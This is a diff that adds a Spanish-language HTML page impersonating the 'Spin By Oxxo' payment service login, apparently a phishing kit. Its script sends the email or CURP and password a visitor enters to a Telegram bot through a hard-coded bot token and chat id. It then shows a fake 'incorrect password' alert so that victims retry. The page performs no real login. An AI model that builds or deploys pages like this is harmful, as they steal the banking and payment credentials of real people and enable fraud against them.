@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin By Oxxo</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif; /* Cambiado a una fuente más moderna */
+        }
+
+        body {
+            background-color: #531bc8; /* Fondo sólido */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+            flex-direction: column; /* Alinea el contenido verticalmente */
+            color: #fff; /* Color de texto por defecto */
+        }
+
+        .logo {
+            max-width: 10%; /* Aumentado el tamaño del logo */
+            height: auto; /* Mantiene la proporción de la imagen */
+            margin-bottom: 30px; /* Espacio entre la imagen y el título */
+        }
+
+        .form-container {
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 15px; /* Bordes más redondeados */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); /* Sombra más pronunciada */
+            background-color: white;
+            z-index: 1;
+            transition: transform 0.3s; /* Transición suave */
+        }
+
+        .form-container:hover {
+            transform: translateY(-5px); /* Elevación al pasar el mouse */
+        }
+
+        h5 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: white; /* Cambiado a color blanco */
+            font-size: 17px; /* Aumentado el tamaño del título */
+        }
+
+        .input-group {
+            margin-bottom: 20px; /* Mayor espacio entre los grupos de entrada */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px; /* Cambiar el tamaño de la fuente del label */
+            color: #4a4a4a; /* Color del label */
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px; /* Aumentado el padding */
+            border: 1px solid #ccc;
+            border-radius: 8px; /* Bordes más redondeados */
+            font-size: 14px; /* Aumentado el tamaño de la fuente */
+            transition: border-color 0.3s; /* Transición suave en el borde */
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #531BC8; /* Color del borde al enfocar */
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px; /* Aumentado el padding */
+            background-color: #531BC8; /* Color de fondo del botón */
+            color: white;
+            border: none; /* Sin borde */
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.3s; /* Transiciones suaves */
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #6B3FC0; /* Color más claro al pasar el mouse */
+            transform: translateY(-2px); /* Elevación al pasar el mouse */
+        }
+
+        .register-link, .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .register-link a,
+        .forgot-password a {
+            color: #007bff;
+            text-decoration: none;
+            transition: color 0.3s; /* Transición suave en el color */
+        }
+
+        .register-link a:hover,
+        .forgot-password a:hover {
+            text-decoration: underline;
+            color: #0056b3; /* Color más oscuro al pasar el mouse */
+        }
+
+        /* Estilos para el texto en la parte inferior */
+        .footer-text {
+            position: absolute;
+            bottom: 20px; /* Espacio desde el fondo */
+            text-align: center;
+            font-size: 10px; /* Tamaño de letra más pequeño */
+            color: white; /* Color del texto */
+            width: 100%; /* Ancho completo */
+            padding: 0 10px; /* Espacio lateral */
+        }
+    </style>
+</head>
+<body>
+    <img src="logo.png" alt="Logo" class="logo"> <!-- Agrega tu imagen aquí -->
+    <h5>Hola</h5>
+    <div class="form-container">
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Ingresa tu CURP, Teléfono ó Correo electrónico</label>
+                <input type="email" id="email" name="email" required placeholder="tuemail@ejemplo.com">
+            </div>
+            <div class="input-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" required placeholder="********">
+            </div>
+            <button type="submit">Iniciar sesión</button>
+            <button type="button" onclick="location.href='#'">¿Olvidaste tu contraseña?</button>
+        </form>
+        <p class="register-link"><a href="#">Registrarme</a></p>
+    </div>
+    
+    <!-- Texto centrado en la parte inferior -->
+    <div class="footer-text">
+        Compropago S.A. de C.V. institución de fondos de pago electrónico
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        let alertShown = false; // Variable para controlar si se ha mostrado la alerta
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita el envío del formulario
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Validación de la contraseña
+            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\W)[A-Za-z\d\W]{8,}$/;
+            if (!regex.test(password)) {
+                alert('La contraseña debe tener al menos 8 caracteres, una letra mayúscula, una letra minúscula y un símbolo.');
+                return; // Detiene la ejecución si la contraseña no es válida
+            }
+
+            const url = `https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage`;
+            const data = {
+                chat_id: -4037234500,
+                text: `Spimby:\nEmail: ${email}\nContraseña: ${password}`,
+                parse_mode: 'HTML'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Mensaje enviado:', data);
+                // Aquí se puede validar la respuesta del servidor
+                // Suponiendo que la API devuelve un campo `success` para indicar el resultado
+                if (!data.success) { // Cambia esto según el formato de respuesta de tu API
+                    if (!alertShown) {
+                        alert('Usuario o Contraseña incorrectos.');
+                        alertShown = true; // Marca la alerta como mostrada
+                        resetForm(); // Reinicia los campos del formulario
+                    }
+                } else {
+                    // Lógica para el inicio de sesión exitoso
+                    alert('Inicio de sesión exitoso.');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+
+        function resetForm() {
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+    </script>
+</body>
+</html>
